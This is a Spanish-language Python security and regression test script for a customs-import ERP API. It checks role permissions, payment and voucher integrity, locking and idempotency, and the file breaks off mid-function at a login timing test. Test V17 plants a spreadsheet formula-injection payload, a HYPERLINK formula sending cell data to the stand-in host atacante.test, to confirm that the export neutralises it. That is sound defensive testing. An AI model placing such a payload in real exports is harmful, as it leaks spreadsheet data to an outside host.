"""Pruebas de seguridad y regresión del ERP contra PostgreSQL."""
import os, sys, time, io, datetime, subprocess, concurrent.futures
from decimal import Decimal

# ==========================================
# 1. VALIDACIÓN DE SEGURIDAD Y ENTORNO
# ==========================================
TEST_DATABASE_URL = os.environ.get("TEST_DATABASE_URL")
if not TEST_DATABASE_URL:
    print("❌ ERROR FATAL: La variable TEST_DATABASE_URL no está definida.", file=sys.stderr)
    sys.exit(1)

# Validar que el nombre de la base de datos contenga obligatoriamente 'test'
db_name = TEST_DATABASE_URL.rsplit("/", 1)[-1].split("?")[0].lower()
if "test" not in db_name:
    print(f"❌ ERROR DE SEGURIDAD: La base de datos '{db_name}' en TEST_DATABASE_URL no contiene 'test'. Abortando inmediatamente.", file=sys.stderr)
    sys.exit(1)

# Asignar DATABASE_URL antes de importar models/main (evita que load_dotenv use el .env real)
os.environ["DATABASE_URL"] = TEST_DATABASE_URL
os.environ["SECRET_KEY"] = "test-secret-key-only-for-pentest-0123456789abcdef"
# Las pruebas validan la configuración de PRODUCCIÓN: Swagger apagado aunque el .env de desarrollo lo active
os.environ["ENABLE_DOCS"] = "false"

# REPO como la raíz del proyecto (carpeta padre de tests/)
REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO not in sys.path:
    sys.path.insert(0, REPO)
os.chdir(REPO)

# ==========================================
# 2. LIMPIEZA DE ESQUEMA Y MIGRACIONES ALEMBIC
# ==========================================
from sqlalchemy import create_engine, text

print(f"[SEGURIDAD] Conectando a base de pruebas: {db_name}")
engine_clean = create_engine(TEST_DATABASE_URL, isolation_level="AUTOCOMMIT")
with engine_clean.connect() as conn:
    print("[LIMPIEZA] Ejecutando: DROP SCHEMA public CASCADE; CREATE SCHEMA public;")
    conn.execute(text("DROP SCHEMA public CASCADE; CREATE SCHEMA public;"))
engine_clean.dispose()

def _ejecutar(paso, args):
    r = subprocess.run([sys.executable, *args], cwd=REPO, capture_output=True, text=True, env=os.environ)
    if r.returncode != 0:
        print("\n" + "=" * 70)
        print(f"❌ FALLÓ: {paso}")
        print((r.stderr or r.stdout).strip())
        print("=" * 70 + "\n")
        sys.exit(2)
    print(f"✅ {paso}")
    return (r.stdout or "") + (r.stderr or "")

# a) Base vacía -> esquema completo + marca en la última migración (receta oficial de Alembic)
_ejecutar("[INIT_DB] scripts/init_db.py (create_all + alembic stamp head)", ["scripts/init_db.py", "--url", TEST_DATABASE_URL])
# b) La cadena de migraciones debe quedar sin pendientes (verifica que 'head' es único y coherente)
_ejecutar("[ALEMBIC] alembic upgrade head (debe ser no-op)", ["-m", "alembic", "upgrade", "head"])
# c) Los modelos deben coincidir con el esquema creado (detecta columnas sin migración en models.py)
_ejecutar("[ALEMBIC] alembic check (models.py == esquema)", ["-m", "alembic", "check"])

# ==========================================
# 3. CARGA DE LA APLICACIÓN Y TESTCLIENT
# ==========================================
import models, main
from database import SessionLocal
from security import create_access_token, get_password_hash
from dependencies import limiter
from fastapi.testclient import TestClient

c = TestClient(main.app)
R = []

def res(id_, titulo, vulnerable, evidencia):
    R.append((id_, titulo, vulnerable, evidencia))
    print(f"[{'VULNERABLE' if vulnerable else 'OK        '}] {id_} {titulo}\n      -> {evidencia}")

db = SessionLocal()
for i, n in [(1, "Admin"), (2, "Logistica"), (3, "Tesoreria"), (4, "Auditor")]:
    db.add(models.CatRol(id_rol=i, nombre=n))
db.flush()
users = {}
for i, n in [(1, "admin"), (2, "logi"), (3, "teso"), (4, "audi")]:
    u = models.Usuario(id_rol=i, username=n, email=f"{n}@x.test", hashed_password=get_password_hash("Clave123!"), is_active=True)
    db.add(u); db.flush(); users[n] = u.id_usuario
imp = models.CatImportador(nombre="IMP A", ruc="20000000001"); imp2 = models.CatImportador(nombre="IMP B", ruc="20000000002")
prov = models.CatProveedor(nombre="SUNAT", categoria="ESTADO_O_TRIBUTO")
banco = models.CatBanco(nombre="BCP")
doc = models.CatalogoDocumentoPago(nombre_documento="FACTURA", multiplicador_financiero=1)
c_trib = models.CatConceptoPago(nombre="TRIBUTOS", clase_aduanera="TRIBUTO"); c_perc = models.CatConceptoPago(nombre="PERCEPCION", clase_aduanera="PERCEPCION"); c_otro = models.CatConceptoPago(nombre="FLETE LOCAL")
db.add_all([imp, imp2, prov, banco, doc, c_trib, c_perc, c_otro]); db.commit()

def tok(n):
    u = db.query(models.Usuario).filter_by(username=n).first()
    return {"Authorization": "Bearer " + create_access_token({"sub": n, "id_rol": u.id_rol, "id_usuario": u.id_usuario})}
H = {n: tok(n) for n in users}

def mk_maestro(fact, tipo="DEFINITIVO"):
    r = c.post("/maestros/", json={"numero_factura": fact, "id_importador": imp.id_importador, "tipo_valor": tipo}, headers=H["logi"]); return r.json()["id_maestro"]
_NUMEROS_DAM = {}
def num_dam(etiqueta):
    """N° de DAM válido y estable para cada etiqueta de prueba ("DAM-V01" -> "118-2026-10-000001")."""
    return _NUMEROS_DAM.setdefault(etiqueta, f"118-2026-10-{len(_NUMEROS_DAM) + 1:06d}")
def mk_dam(idm, num, canal="VERDE"):
    r = c.post("/dams/", json={"id_maestro": idm, "numero_de_dam": num_dam(num), "canal_control": canal}, headers=H["logi"]); return r.json()["id_dam"]
def mk_gasto(idd, concepto, monto, moneda="USD", doc_n=None):
    r = c.post("/gastos/", json={"id_dam": idd, "id_concepto": concepto, "id_proveedor": prov.id_proveedor, "id_tipo_doc": doc.id_tipo_doc,
                                  "monto_original": str(monto), "moneda": moneda, "numero_documento": doc_n}, headers=H["logi"])
    return r.json()["id_gasto"]
def mk_voucher(monto, moneda="USD", importador=None, num="OP1"):
    r = c.post("/vouchers/", json={"banco_id": banco.id_banco, "id_importador": importador or imp.id_importador, "numero_operacion": num,
                                    "monto_total": str(monto), "moneda": moneda, "fecha_transferencia": str(datetime.date.today())}, headers=H["teso"])
    return r.json()
def pagar(gasto, voucher, importe, origen, moneda="USD", tc="1.00", who="teso", extra=None):
    body = {"id_gasto": gasto, "voucher_id": voucher, "moneda": moneda, "importe": str(importe), "tipo_cambio": str(tc), "monto_moneda_origen": str(origen)}
    return c.post("/pagos/", json=body, headers={**H[who], **(extra or {})})
def voucher(idv):
    db.expire_all(); return db.get(models.VoucherBancario, idv)
def dam(idd):
    db.expire_all(); return db.get(models.DetalleDam, idd)
def gasto(idg):
    db.expire_all(); return db.get(models.RegistroGasto, idg)

def chk(id_, titulo, cond, evid):
    R.append((id_, titulo, cond, evid))
    print(f"[{'PASA ' if cond else 'FALLA'}] {id_} {titulo}\n      -> {evid}")

def pagar2(gasto_, voucher_, importe, moneda="USD", tc="1.00", who="teso", cruzada=False, origen=None, extra=None):
    body = {"id_gasto": gasto_, "voucher_id": voucher_, "moneda": moneda, "importe": str(importe), "tipo_cambio": str(tc),
            "pago_moneda_cruzada": cruzada, "monto_moneda_origen": (str(origen) if origen is not None else None)}
    return c.post("/pagos/", json=body, headers={**H[who], **(extra or {})})

def det(r):
    try:
        return str(r.json().get("detail", ""))[:110]
    except Exception:
        return r.text[:110]

print("\n=========== A) ATAQUES CRÍTICOS (deben ser RECHAZADOS) ===========")
m = mk_maestro("F-V01"); d = mk_dam(m, "DAM-V01", "ROJO")
r = c.put(f"/dams/{d}", json={"estado_dam": "CON LEVANTE", "aforo_realizado": True}, headers=H["audi"])
chk("V01a", "Auditor no puede tocar DAMs", r.status_code == 403 and dam(d).estado_dam == "NUMERADA / EN EVALUACIÓN", f"{r.status_code} estado={dam(d).estado_dam}")
r = c.put(f"/dams/{d}", json={"estado_dam": "CON LEVANTE"}, headers=H["logi"])
chk("V01b", "Logística no puede saltar NUMERADA -> CON LEVANTE", r.status_code == 400, f"{r.status_code} {det(r)}")
r = c.post("/dams/", json={"id_maestro": m, "numero_de_dam": num_dam("DAM-V01-B"), "estado_dam": "CON LEVANTE", "aforo_realizado": True, "fecha_levante": "2026-01-01"}, headers=H["logi"])
chk("V01c", "Crear DAM ignora estado/aforo/fecha_levante enviados", r.status_code == 200 and r.json()["estado_dam"] == "NUMERADA / EN EVALUACIÓN" and not r.json()["aforo_realizado"], f"{r.status_code} {r.json().get('estado_dam')}")

m = mk_maestro("F-V02"); d = mk_dam(m, "DAM-V02"); g = mk_gasto(d, c_trib.id_concepto, 5000)
r = c.post("/pagos/", json={"id_gasto": g, "moneda": "USD", "importe": "5000", "tipo_cambio": "1", "monto_moneda_origen": "5000"}, headers=H["teso"])
chk("V02", "Pago sin voucher rechazado", r.status_code == 422 and gasto(g).estado_pago == "PENDIENTE", f"{r.status_code} gasto={gasto(g).estado_pago}")

m = mk_maestro("F-V03"); d = mk_dam(m, "DAM-V03"); g = mk_gasto(d, c_otro.id_concepto, 100); v = mk_voucher(100, num="OP-V03")
r = pagar2(g, v["id_voucher"], "0.01", cruzada=True, origen="-50000")
r2 = pagar2(g, v["id_voucher"], "-5")
chk("V03", "Montos negativos rechazados", r.status_code == 422 and r2.status_code == 422 and voucher(v["id_voucher"]).saldo_disponible == Decimal("100.00"), f"{r.status_code}/{r2.status_code} saldo={voucher(v['id_voucher']).saldo_disponible}")

m = mk_maestro("F-V04"); d = mk_dam(m, "DAM-V04"); g = mk_gasto(d, c_otro.id_concepto, 1000); v = mk_voucher(1000, num="OP-V04")
r = c.post("/pagos/", json={"id_gasto": g, "voucher_id": v["id_voucher"], "moneda": "USD", "importe": "1000", "tipo_cambio": "1", "monto_moneda_origen": "0.01"}, headers=H["teso"])
chk("V04a", "monto_moneda_origen del cliente ignorado sin cruzada (débito real = 1000)", r.status_code == 200 and voucher(v["id_voucher"]).saldo_disponible == Decimal("0.00"), f"{r.status_code} saldo={voucher(v['id_voucher']).saldo_disponible}")
m = mk_maestro("F-V04b"); d = mk_dam(m, "DAM-V04b"); g = mk_gasto(d, c_otro.id_concepto, 1000); v = mk_voucher(1000, num="OP-V04b")
r = pagar2(g, v["id_voucher"], 1000, cruzada=True, origen="0.01")
chk("V04b", "Débito cruzado muy por debajo del teórico rechazado", r.status_code == 400, f"{r.status_code} {det(r)}")

m = mk_maestro("F-V05"); d = mk_dam(m, "DAM-V05"); g = mk_gasto(d, c_otro.id_concepto, 1000); v = mk_voucher(10, "PEN", num="OP-V05")
r = pagar2(g, v["id_voucher"], 10, "PEN", "0.01")
chk("V05a", "TC 0.01 rechazado (banda 2.50-5.50)", r.status_code == 400, f"{r.status_code} {det(r)}")
db.add(models.HistorialTipoCambio(fecha=datetime.date.today(), precio_compra=Decimal("3.74"), precio_venta=Decimal("3.75"))); db.commit()
r = pagar2(g, v["id_voucher"], 10, "PEN", "4.50")
chk("V05b", "TC fuera de +-5% del oficial SUNAT del día rechazado", r.status_code == 400, f"{r.status_code} {det(r)}")

m = mk_maestro("F-V06"); d = mk_dam(m, "DAM-V06"); g = mk_gasto(d, c_otro.id_concepto, 100); v = mk_voucher(100, num="OP-V06")
p = pagar2(g, v["id_voucher"], 100).json()
r1 = c.put(f"/pagos/{p['id_pago']}", json={"monto_moneda_origen": "90000"}, headers=H["audi"])
r2 = c.put(f"/pagos/{p['id_pago']}", json={"monto_moneda_origen": "90000"}, headers=H["teso"])
r3 = c.put(f"/pagos/{p['id_pago']}", json={"id_gasto": 1}, headers=H["admin"])
chk("V06/V07", "Edición financiera de pagos bloqueada (auditor 403, tesorería/admin 422)", (r1.status_code, r2.status_code, r3.status_code) == (403, 422, 422), f"{r1.status_code}/{r2.status_code}/{r3.status_code}")

m = mk_maestro("F-V08"); d = mk_dam(m, "DAM-V08"); g = mk_gasto(d, c_otro.id_concepto, 100); v = mk_voucher(100, num="OP-V08")
a = c.put(f"/gastos/{g}", json={"monto_original": "1"}, headers=H["audi"]).status_code
b = c.put(f"/vouchers/{v['id_voucher']}", json={"monto_total": "999999"}, headers=H["audi"]).status_code
t = c.put(f"/gastos/{g}", json={"monto_original": "1"}, headers=H["teso"]).status_code
chk("V08 (parcial)", "Auditor no edita gastos ni vouchers; Tesorería no cambia montos de gastos", (a, b, t) == (403, 403, 403), f"{a}/{b}/{t}")

m = mk_maestro("F-V11"); d = mk_dam(m, "DAM-V11"); g = mk_gasto(d, c_otro.id_concepto, 100); g2 = mk_gasto(d, c_otro.id_concepto, 300, doc_n="X-9"); v = mk_voucher(1000, num="OP-V11")
r1 = pagar2(g, v["id_voucher"], 50, extra={"Idempotency-Key": "k-1"}); r2 = pagar2(g2, v["id_voucher"], 300, who="admin", extra={"Idempotency-Key": "k-1"})
chk("V11", "Idempotency-Key aislada por usuario (el pago del 2do usuario se procesa)", r2.status_code == 200 and r2.json()["id_gasto"] == g2 and gasto(g2).estado_pago == "PAGADO", f"2do -> gasto {r2.json().get('id_gasto')} {gasto(g2).estado_pago}")

print("\n=========== B) REGRESIÓN: FLUJOS LEGÍTIMOS (deben FUNCIONAR) ===========")
m = mk_maestro("F-R1"); d = mk_dam(m, "DAM-R1", "VERDE")
gt = mk_gasto(d, c_trib.id_concepto, 5000, doc_n="T-R1"); gp = mk_gasto(d, c_perc.id_concepto, 800, doc_n="P-R1"); v = mk_voucher(6000, num="OP-R1")
chk("R1a", "Proforma registrada -> PENDIENTE PAGO PROFORMA", dam(d).estado_dam == "PENDIENTE PAGO PROFORMA", dam(d).estado_dam)
a = pagar2(gt, v["id_voucher"], 5000); b = pagar2(gp, v["id_voucher"], 800)
chk("R1b", "Canal VERDE: pagar proforma con voucher -> CON LEVANTE y voucher descontado exacto", a.status_code == b.status_code == 200 and dam(d).estado_dam == "CON LEVANTE" and voucher(v["id_voucher"]).saldo_disponible == Decimal("200.00"), f"DAM={dam(d).estado_dam} saldo={voucher(v['id_voucher']).saldo_disponible}")
r = c.put(f"/maestros/{m}", json={"status_llegada": "EN ALMACÉN", "fecha_recepcion_almacen": str(datetime.date.today())}, headers=H["logi"])
db.expire_all(); est = db.get(models.MaestroImportacion, m).estado_documentario
chk("R1c", "Ingreso a almacén -> ATE. TOTAL", est == "ATE. TOTAL", est)
r = c.put(f"/dams/{d}", json={"serie": "X"}, headers=H["logi"])
chk("R1d", "DAM de contenedor en ATE. TOTAL bloqueada para Logística", r.status_code == 403, str(r.status_code))

m = mk_maestro("F-R2"); d = mk_dam(m, "DAM-R2", "ROJO")
gt = mk_gasto(d, c_trib.id_concepto, 100, doc_n="T-R2"); gp = mk_gasto(d, c_perc.id_concepto, 10, doc_n="P-R2")
pagar2(gt, v["id_voucher"], 100); pagar2(gp, v["id_voucher"], 10)
chk("R2a", "Canal ROJO: tras proforma -> PENDIENTE DE AFORO", dam(d).estado_dam == "PENDIENTE DE AFORO", dam(d).estado_dam)
r = c.put(f"/dams/{d}", json={"estado_dam": "CON LEVANTE"}, headers=H["logi"])
chk("R2b", "Botón 'Aforo Conforme' -> CON LEVANTE + aforo_realizado", r.status_code == 200 and dam(d).estado_dam == "CON LEVANTE" and dam(d).aforo_realizado, f"{r.status_code} {dam(d).estado_dam} aforo={dam(d).aforo_realizado}")
db.expire_all(); log = db.query(models.AuditLog).filter_by(accion="CAMBIO ESTADO DAM").order_by(models.AuditLog.id_log.desc()).first()
chk("R2c", "Cambio de estado DAM queda en bitácora", log is not None and "PENDIENTE DE AFORO" in log.detalles, log.detalles if log else "sin log")
r = c.put(f"/dams/{d}", json={"numero_de_dam": num_dam("DAM-R2"), "serie": "S1", "canal_control": "ROJO", "estado_dam": "CON LEVANTE"}, headers=H["logi"])
chk("R2d", "Guardar formulario completo de DAM (estado sin cambios) sigue funcionando", r.status_code == 200, str(r.status_code))

m = mk_maestro("F-R3", "GARANTIZADO")
rd = c.post("/dams/", json={"id_maestro": m, "numero_de_dam": num_dam("DAM-R3"), "canal_control": "ROJO", "monto_valor_provisional_usd": "100"}, headers=H["logi"]); d = rd.json()["id_dam"]
gt = mk_gasto(d, c_trib.id_concepto, 10, doc_n="T-R3"); gp = mk_gasto(d, c_perc.id_concepto, 10, doc_n="P-R3"); v = mk_voucher(100, num="OP-R3")
pagar2(gt, v["id_voucher"], 10); pagar2(gp, v["id_voucher"], 10)
s = [c.put(f"/dams/{d}", json={"estado_dam": e}, headers=H["logi"]).status_code for e in ["OBSERVADA / NOTIFICADA", "CON LEVANTE (GARANTÍA ACTIVA)", "EN REVISIÓN OMC (POST-LEVANTE)", "GARANTÍA CERRADA / LIQUIDADA"]]
chk("R3", "Flujo GARANTIZADO (observación -> garantía -> OMC -> liquidada)", s == [200, 200, 200, 200] and dam(d).estado_dam == "GARANTÍA CERRADA / LIQUIDADA", f"{s} {dam(d).estado_dam}")

m = mk_maestro("F-R4"); d = mk_dam(m, "DAM-R4"); g = mk_gasto(d, c_otro.id_concepto, 375, "PEN"); v = mk_voucher(1000, "PEN", num="OP-R4")
r = pagar2(g, v["id_voucher"], 375, "PEN", "3.75")
chk("R4", "Gasto PEN con voucher PEN descuenta S/ 375 (antes descontaba 100 = 375/3.75)", r.status_code == 200 and voucher(v["id_voucher"]).saldo_disponible == Decimal("625.00"), f"saldo={voucher(v['id_voucher']).saldo_disponible}")

m = mk_maestro("F-R5"); d = mk_dam(m, "DAM-R5"); g = mk_gasto(d, c_otro.id_concepto, 1000, "USD"); v = mk_voucher(10000, "PEN", num="OP-R5")
r = pagar2(g, v["id_voucher"], "3754.30", "PEN", "3.7543")
pg = r.json()
chk("R5", "Gasto USD desde voucher PEN con TC 3.7543 (4 decimales conservados)", r.status_code == 200 and gasto(g).estado_pago == "PAGADO" and str(pg.get("tipo_cambio_aplicado")).startswith("3.7543"), f"{r.status_code} {gasto(g).estado_pago} tc_aplicado={pg.get('tipo_cambio_aplicado')} saldo={voucher(v['id_voucher']).saldo_disponible}")

m = mk_maestro("F-R6"); d = mk_dam(m, "DAM-R6"); g = mk_gasto(d, c_otro.id_concepto, 100, "USD"); v = mk_voucher(1000, "PEN", num="OP-R6")
r = pagar2(g, v["id_voucher"], 100, "USD", "3.75", cruzada=True, origen="380.00")
pg = r.json()
chk("R6", "Moneda cruzada: USD 100 al 3.75 con débito bancario S/ 380 -> diferencia S/ 5", r.status_code == 200 and Decimal(str(pg.get("gasto_financiero_tc"))) == Decimal("5.00") and voucher(v["id_voucher"]).saldo_disponible == Decimal("620.00"), f"{r.status_code} dif={pg.get('gasto_financiero_tc')} saldo={voucher(v['id_voucher']).saldo_disponible} {det(r) if r.status_code != 200 else ''}")

m = mk_maestro("F-R7"); d = mk_dam(m, "DAM-R7"); g = mk_gasto(d, c_otro.id_concepto, "100.03"); v = mk_voucher(1000, num="OP-R7")
r = pagar2(g, v["id_voucher"], "100.00")
db.expire_all(); zd = db.query(models.RegistroPago).filter_by(id_gasto=g, es_ajuste_sistema=True).first()
chk("R7", "Ajuste ZD por centavos sigue cerrando el gasto", r.status_code == 200 and gasto(g).estado_pago == "PAGADO" and zd is not None, f"{gasto(g).estado_pago} zd={'sí' if zd else 'no'}")

# R7b: anular el pago principal revierte también el ajuste de centavos, devuelve el dinero y deja respaldo de ambos
id_pago_r7 = r.json()["id_pago"]; id_zd_r7 = zd.id_pago if zd else None
r_an = c.request("DELETE", f"/pagos/{id_pago_r7}", json={"motivo": "Prueba R7b: anulación con ajuste de centavos"}, headers=H["teso"])
db.expire_all()
quedan = db.query(models.RegistroPago).filter_by(id_gasto=g).count()
respaldos = db.query(models.PagoEliminado).filter(models.PagoEliminado.id_gasto == g).count()
chk("R7b", "Anular el pago revierte el ajuste ZD, devuelve el saldo al voucher, deja 2 respaldos y el gasto vuelve a PENDIENTE",
    r_an.status_code == 200 and quedan == 0 and respaldos == 2 and voucher(v["id_voucher"]).saldo_disponible == Decimal("1000.00") and gasto(g).estado_pago == "PENDIENTE" and id_zd_r7 is not None,
    f"{r_an.status_code} quedan={quedan} respaldos={respaldos} saldo={voucher(v['id_voucher']).saldo_disponible} estado={gasto(g).estado_pago}")

m = mk_maestro("F-R8"); d = mk_dam(m, "DAM-R8"); g = mk_gasto(d, c_otro.id_concepto, 200); v = mk_voucher(500, num="OP-R8")
p = pagar2(g, v["id_voucher"], 200).json()
rd = c.request("DELETE", f"/pagos/{p['id_pago']}", json={"motivo": "anulación de prueba"}, headers=H["teso"])
chk("R8", "Anular pago devuelve exactamente el débito al voucher", rd.status_code == 200 and voucher(v["id_voucher"]).saldo_disponible == Decimal("500.00") and gasto(g).estado_pago == "PENDIENTE", f"saldo={voucher(v['id_voucher']).saldo_disponible} gasto={gasto(g).estado_pago}")

m = mk_maestro("F-R9"); d = mk_dam(m, "DAM-R9"); g = mk_gasto(d, c_otro.id_concepto, 200); v = mk_voucher(500, num="OP-R9")
a = pagar2(g, v["id_voucher"], 50, extra={"Idempotency-Key": "doble-clic"}); b = pagar2(g, v["id_voucher"], 50, extra={"Idempotency-Key": "doble-clic"})
chk("R9", "Doble clic con misma clave = un solo cobro", a.json()["id_pago"] == b.json()["id_pago"] and voucher(v["id_voucher"]).saldo_disponible == Decimal("450.00"), f"saldo={voucher(v['id_voucher']).saldo_disponible}")

a = c.put(f"/gastos/{g}", json={"observaciones": "nota de tesorería"}, headers=H["teso"]).status_code
nuevo = pagar2(g, v["id_voucher"], 10).json()["id_pago"]
b = c.put(f"/pagos/{nuevo}", json={"fecha_pago": "2026-11-01"}, headers=H["teso"]).status_code
chk("R10", "Tesorería edita observaciones de gasto y fecha de pago", (a, b) == (200, 200), f"{a}/{b}")

r = c.get("/pagos/", headers=H["audi"]); r2 = c.get("/gastos/", headers=H["audi"])
chk("R11", "Listados de pagos y gastos siguen respondiendo (Auditor lee)", r.status_code == r2.status_code == 200, f"{r.status_code}/{r2.status_code}")

print("\n=========== C) HALLAZGOS ALTOS / MEDIOS (fase 2) ===========")
# V08: matriz RBAC
m = mk_maestro("F-N1")
cods = {
    "audi POST /maestros": c.post("/maestros/", json={"numero_factura": "F-AUDI-N"}, headers=H["audi"]).status_code,
    "audi PUT /maestros": c.put(f"/maestros/{m}", json={"tipo_valor": "GARANTIZADO"}, headers=H["audi"]).status_code,
    "teso PUT /maestros": c.put(f"/maestros/{m}", json={"n_cont_fisico": "X"}, headers=H["teso"]).status_code,
    "audi POST /bancos": c.post("/bancos/", json={"nombre": "BANCO FALSO"}, headers=H["audi"]).status_code,
    "audi PUT /conceptos": c.put(f"/conceptos/{c_otro.id_concepto}", json={"nombre": "TRIBUTOS FALSOS"}, headers=H["audi"]).status_code,
    "audi DELETE /importadores": c.request("DELETE", f"/importadores/{imp2.id_importador}", headers=H["audi"]).status_code,
    "audi PUT /tipos-documento": c.put(f"/tipos-documento/{doc.id_tipo_doc}", json={"multiplicador_financiero": -1}, headers=H["audi"]).status_code,
    "teso PUT /conceptos": c.put(f"/conceptos/{c_otro.id_concepto}", json={"descripcion": "x"}, headers=H["teso"]).status_code,
    "logi POST /bancos": c.post("/bancos/", json={"nombre": "BANCO LOGI"}, headers=H["logi"]).status_code,
}
ok_esperado = {
    "logi POST /proveedores": c.post("/proveedores/", json={"nombre": "PROV LOGI"}, headers=H["logi"]).status_code,
    "teso POST /bancos": c.post("/bancos/", json={"nombre": "BANCO TESO"}, headers=H["teso"]).status_code,
    "logi PUT /conceptos": c.put(f"/conceptos/{c_otro.id_concepto}", json={"descripcion": "ok"}, headers=H["logi"]).status_code,
    "audi GET /bancos": c.get("/bancos/", headers=H["audi"]).status_code,
}
chk("V08", "Matriz RBAC: Auditor sin escritura; cada rol solo en su ámbito",
    all(v == 403 for v in cods.values()) and all(v == 200 for v in ok_esperado.values()),
    f"denegados={[k for k, v in cods.items() if v == 403].__len__()}/{len(cods)} {cods if not all(v == 403 for v in cods.values()) else ''} permitidos={ok_esperado}")

# V12: bloqueo optimista
m = mk_maestro("F-N2")
ver = c.get("/maestros/", params={"search": "F-N2"}, headers=H["logi"]).json()["data"][0]["version"]
a = c.put(f"/maestros/{m}", json={"n_cont_fisico": "USUARIA-A", "version": ver}, headers=H["logi"])
b = c.put(f"/maestros/{m}", json={"n_cont_fisico": "USUARIA-B (vieja)", "version": ver}, headers=H["admin"])
cc = c.put(f"/maestros/{m}", json={"n_cont_fisico": "USUARIA-B (recargó)", "version": a.json()["version"]}, headers=H["admin"])
chk("V12", "Versión obsoleta -> 409; versión vigente -> 200", (a.status_code, b.status_code, cc.status_code) == (200, 409, 200), f"{a.status_code}/{b.status_code}/{cc.status_code} final={cc.json().get('n_cont_fisico')}")

v = mk_voucher(500, num="OP-N3"); vver = v["version"]
gN3 = mk_gasto(mk_dam(mk_maestro("F-N3"), "DAM-N3"), c_otro.id_concepto, 10)
pagar2(gN3, v["id_voucher"], 10)  # el pago incrementa la versión del voucher
r = c.put(f"/vouchers/{v['id_voucher']}", json={"numero_operacion": "OP-N3-EDIT", "version": vver}, headers=H["teso"])
chk("V12b", "Voucher editado con versión anterior a un pago -> 409", r.status_code == 409, f"{r.status_code}")

# V09: voucher duplicado
d1 = mk_voucher(100, num="OP-DUP-N"); r = c.post("/vouchers/", json={"banco_id": banco.id_banco, "id_importador": imp.id_importador, "numero_operacion": " op-dup-n ", "monto_total": "100", "moneda": "USD", "fecha_transferencia": str(datetime.date.today())}, headers=H["teso"])
banco2 = c.post("/bancos/", json={"nombre": "INTERBANK"}, headers=H["teso"]).json()["id_banco"]
r2 = c.post("/vouchers/", json={"banco_id": banco2, "id_importador": imp.id_importador, "numero_operacion": "OP-DUP-N", "monto_total": "100", "moneda": "USD", "fecha_transferencia": str(datetime.date.today())}, headers=H["teso"])
r3 = c.post("/vouchers/", json={"banco_id": banco.id_banco, "id_importador": imp.id_importador, "numero_operacion": "OP-FUT", "monto_total": "100", "moneda": "USD", "fecha_transferencia": "2099-01-01"}, headers=H["teso"])
chk("V09", "Mismo N° operación en mismo banco rechazado (ignora mayúsculas/espacios); otro banco OK; fecha futura rechazada",
    (r.status_code, r2.status_code, r3.status_code) == (400, 200, 400), f"{r.status_code}/{r2.status_code}/{r3.status_code}")

# V14: Logística no revierte pagos
m = mk_maestro("F-N5"); d = mk_dam(m, "DAM-N5"); g = mk_gasto(d, c_otro.id_concepto, 100); v = mk_voucher(100, num="OP-N5"); pagar2(g, v["id_voucher"], 100)
a = c.request("DELETE", f"/gastos/{g}?forzar_reversion_pagos=true", json={"motivo": "logistica borra pagos"}, headers=H["logi"])
b = c.request("DELETE", f"/gastos/{g}?forzar_reversion_pagos=true", json={"motivo": "admin autoriza reversion"}, headers=H["admin"])
chk("V14", "Logística no puede revertir pagos (403); Admin sí (200) y el voucher recupera saldo", (a.status_code, b.status_code) == (403, 200) and voucher(v["id_voucher"]).saldo_disponible == Decimal("100.00"), f"{a.status_code}/{b.status_code} saldo={voucher(v['id_voucher']).saldo_disponible}")

# V13: candados ATE. TOTAL + fecha de recepción
m = mk_maestro("F-N6"); d = mk_dam(m, "DAM-N6", "VERDE")
gt = mk_gasto(d, c_trib.id_concepto, 10, doc_n="T-N6"); gp = mk_gasto(d, c_perc.id_concepto, 10, doc_n="P-N6"); v = mk_voucher(100, num="OP-N6")
pt = pagar2(gt, v["id_voucher"], 10).json(); pagar2(gp, v["id_voucher"], 10)
sin_fecha = c.put(f"/maestros/{m}", json={"status_llegada": "EN ALMACÉN"}, headers=H["logi"]).status_code
c.put(f"/maestros/{m}", json={"status_llegada": "EN ALMACÉN", "fecha_recepcion_almacen": str(datetime.date.today())}, headers=H["logi"])
db.expire_all(); est = db.get(models.MaestroImportacion, m).estado_documentario
dp = c.request("DELETE", f"/pagos/{pt['id_pago']}", json={"motivo": "intento en ATE TOTAL"}, headers=H["teso"]).status_code
dg = c.request("DELETE", f"/gastos/{gt}", json={"motivo": "intento en ATE TOTAL"}, headers=H["logi"]).status_code
dd = c.request("DELETE", f"/dams/{d}", json={"motivo": "intento en ATE TOTAL"}, headers=H["logi"]).status_code
chk("V13", "EN ALMACÉN exige fecha (400); en ATE. TOTAL no se anulan pagos/gastos/DAMs (403)", (sin_fecha, est, dp, dg, dd) == (400, "ATE. TOTAL", 403, 403, 403), f"sin_fecha={sin_fecha} estado={est} pago={dp} gasto={dg} dam={dd}")

m = mk_maestro("F-N7"); d = mk_dam(m, "DAM-N7", "ROJO")
gt = mk_gasto(d, c_trib.id_concepto, 10, doc_n="T-N7"); gp = mk_gasto(d, c_perc.id_concepto, 10, doc_n="P-N7")
r = c.put(f"/maestros/{m}", json={"tipo_valor": "GARANTIZADO"}, headers=H["logi"])
chk("V13b", "No se cambia DEFINITIVO->GARANTIZADO con DAMs en trámite (400)", r.status_code == 400, f"{r.status_code} {det(r)}")
r = c.post("/maestros/", json={"numero_factura": "F-N7b", "estado_documentario": "ATE. TOTAL", "estado_levante": "CON LEVANTE"}, headers=H["logi"])
chk("V13c", "Crear maestro ignora estado_documentario/estado_levante del cliente", r.status_code == 200 and r.json()["estado_documentario"] == "SIN NUMERAR" and r.json()["estado_levante"] == "SIN LEVANTE", f"{r.status_code} {r.json().get('estado_documentario')}/{r.json().get('estado_levante')}")

# V17: fórmulas en Excel
m = mk_maestro("F-N9"); d = mk_dam(m, "DAM-N9")
c.post("/gastos/", json={"id_dam": d, "id_concepto": c_otro.id_concepto, "id_proveedor": prov.id_proveedor, "id_tipo_doc": doc.id_tipo_doc, "monto_original": "1",
                         "observaciones": '=HYPERLINK("http://atacante.test/?d="&A1,"Ver")'}, headers=H["logi"])
import openpyxl
r = c.get("/gastos/exportar", params={"search": num_dam("DAM-N9")}, headers=H["audi"])
wb = openpyxl.load_workbook(io.BytesIO(r.content)); tipos = []; guiones_ok = True
for ws in wb.worksheets:
    for row in ws.iter_rows():
        for cell in row:
            if isinstance(cell.value, str) and "HYPERLINK" in cell.value:
                tipos.append(cell.data_type)
            if cell.value == "'-":
                guiones_ok = False
chk("V17", "Texto con '=' se exporta como texto, no fórmula", tipos and all(t == "s" for t in tipos) and guiones_ok, f"tipos={tipos} marcadores '-' intactos={guiones_ok}")

# V18: tiempo de login
limiter.enabled = False
def t(u):
